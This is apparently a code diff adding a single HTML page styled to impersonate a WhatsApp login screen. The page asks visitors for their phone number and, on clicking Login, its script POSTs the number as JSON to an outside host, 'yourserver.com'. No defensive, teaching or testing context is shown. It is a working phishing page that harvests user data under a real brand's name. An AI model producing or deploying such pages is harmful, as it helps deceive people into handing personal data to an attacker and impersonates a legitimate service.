@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>WhatsApp Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      text-align: center;
+      padding: 50px;
+    }
+    h1 {
+      color: #25D366;
+    }
+    input {
+      padding: 10px;
+      margin: 10px;
+      width: 250px;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: #25D366;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>WhatsApp Login</h1>
+  <p>Enter your phone number to continue:</p>
+  <input type="text" placeholder="Phone Number" id="phone">
+  <button onclick="sendData()">Login</button>
+
+  <script>
+    function sendData() {
+      var phone = document.getElementById("phone").value;
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://yourserver.com/login", true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.send(JSON.stringify({ phone: phone }));
+    }
+  </script>
+</body>
+</html>
